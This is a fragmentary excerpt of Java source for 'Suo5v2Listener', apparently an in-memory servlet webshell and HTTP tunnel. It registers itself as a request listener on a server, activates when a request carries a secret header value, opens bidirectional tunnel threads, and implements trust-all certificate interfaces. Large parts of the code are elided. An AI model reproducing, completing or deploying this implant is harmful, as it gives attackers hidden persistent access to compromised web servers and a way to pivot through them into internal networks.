...
public class Suo5v2Listener extends ClassLoader implements ServletRequestListener, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5v2Listener() {
    }

    public Suo5v2Listener(ClassLoader c) {
        super(c);
    }

    public Suo5v2Listener(InputStream var1, OutputStream var2, String var3) {
        this.gInStream = var1;
        this.gOutStream = var2;
        this.gtunId = var3;
    }

    public Suo5v2Listener(String var1, int var2) {
        this.gtunId = var1;
        this.mode = var2;
    }
    ...
    public String addListener() throws Exception {
        ...
        String listenerName = "Suo5v2Listener";
    ...
    public void requestInitialized(ServletRequestEvent var1) {
        ...
        try {
            if (var2.getHeader(headerName) != null && var2.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse var3 = (HttpServletResponse)this.getResponseFromRequest(var2);
                (new Suo5v2Listener()).process(var2, var3);
            }
    ...
    private void processFullStream(HttpServletRequest var1, HttpServletResponse var2, HashMap var3, String var4) throws Exception {
        ...
        try {
            ...
            Suo5v2Listener var14 = new Suo5v2Listener(var12, var13, var4);
    ...
    private byte[] performCreate(HttpServletRequest var1, HashMap var2, String var3, boolean var4) throws Exception {
        ...
        try {
            ...
            if (var4) {
                (new Thread(new Suo5v2Listener(var3, 1))).start();
                (new Thread(new Suo5v2Listener(var3, 2))).start();
            }
